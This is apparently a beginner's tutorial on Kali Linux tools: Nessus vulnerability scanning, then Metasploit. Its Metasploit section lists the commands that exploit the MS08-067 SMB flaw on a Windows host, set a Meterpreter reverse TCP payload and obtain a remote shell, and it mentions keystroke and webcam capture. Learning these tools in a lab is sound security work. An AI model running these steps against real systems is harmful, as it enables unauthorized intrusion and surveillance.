# Kali-Tools-Write-Ups

## Nessus

This tool is very useful in bringing out all the vulnerabilities it knows on a target machine or target network.

### Installation

You can download the home version from `. Keep in mind that this requires a registration as you will get a registration code in your email.
Once you download the .deb file, run the below command to install the package:

        dpkg –i Nessus-6.5.6-debian6_amd64.deb
        
Next, we start the service using,

        #/etc/init.d/nessusd start
        
### Usage

Nessus uses a web client and hence is accessed using the browser. The default port used by Nessus is 8834 and can be reached using the URL `https://localhost:8834`. Follow the manual instructions in the web-page including the screen that asks for your registration code. You will finally reach the page that asks you to create a new Scan. 

A new Scan is the target scan configuration. A scan configuration can be saved so that one can rerun the same scan multiple times. For a basic scan, select `Basic Network Scan` as the scan template. This template does a scan of many network vulnerabilities Nessus is aware of. Give the scan a name and description. The Targets field is the network or the host you wish to target the scan towards. This could be an IP address, a domain or even a network. 

On saving the scan, you reach the screen with all the scans you have created. If you are ready to execute the scan, hit the Launch icon on the scan record in the table. This will initiate the scan. This could take a while depending on how many hosts you are targeting.

Once it is complete, you can click on the scan to get the results of the scan. You will get to see the split up the vulnerabilities found ranging from Critical, High to just Informational findings. To see the vulnerabilities, click the host. The best part of Nessus lies here. It lists what it found and also a shit load of information about the vulnerability!! It also tries to list what you could use to exploit this vulnerability (shhh!)

## Metasploit

Metasploit is the mother load of exploits. This suite is a compilation of many exploit modules which can be easily used to attack a target machine. 

### Installation

Metasploit comes installed on Kali Linux. It can be launched by either using the Metasploit icon in the Applications menu or by using the command `msfconsole` in a terminal. If you are using any other Linux OS, there is plenty of documentation out there. [This](http://docs.kali.org/category/installation) is the official documentation.

### Usage

Now we come to the fun part! Since there are a multitude of modules, Metasploit offers a search feature which helps use find modules for the exploit we are looking for. For example, if we are searching for the exploit on Microsoft's defect MS08_067, you would do a `search MS08_067' and it will list the modules it has on that defect. (Please note: your Windows VM should not have the patch installed to fix this vulnerability)

Now once you have found your exploit module, we need to load that module on Metasploit. We do this by

		use exploit/windows/smb/ms08_067_netapi

Once the module has loaded, Metasploit requires us to give it the parameters and configuration dependencies for the module. To see what all it uses, hit

		show options

One will be able to see parameters like RHOST = Remote target Host, LHOST = Local Host, SRVHOST = Server IP, etc. This will vary depending on the module that you have loaded of course.
Suppose we wish to load the RHOST remote target IP in this case, all we would need to do is,

		set RHOST 192.168.1.9

This sets 192.168.1.9 as the target host.

Next, we come to the payloads. Payloads define the basic implementation of the module, this basically determines what kind of attack you want to conduct the attack and what you want to get after exploiting the vulnerability. For the different types of payloads, check [this](https://www.offensive-security.com/metasploit-unleashed/payload-types/) out.

For this we use Reverse TCP payload which is a method which sets us the server (uses a non standard port) and the client will be the target machine using a standard port. This makes sure that we don't have to depend on ports that potentially could be blocked by some firewalls.

		set payload windows/meterpreter/reverse_tcp

We obtain a Meterpreter session in this case which is a payload from Metasploit which by itself is very powerful. This uses DLL injections to execute client-side scripts which have a server written in C and the client is written in Ruby. The functions range from trying to elevate privileges in the machine to getting access to the key-presses on the machine and recording feed from the remote machine’s microphone or web camera. 

The final command and the magic begins:

		exploit

After the exploit is complete, we get a Meterpreter shell which helps us execute any command on the remote Windows machine. Congratulations!! You have just performed your first exploit.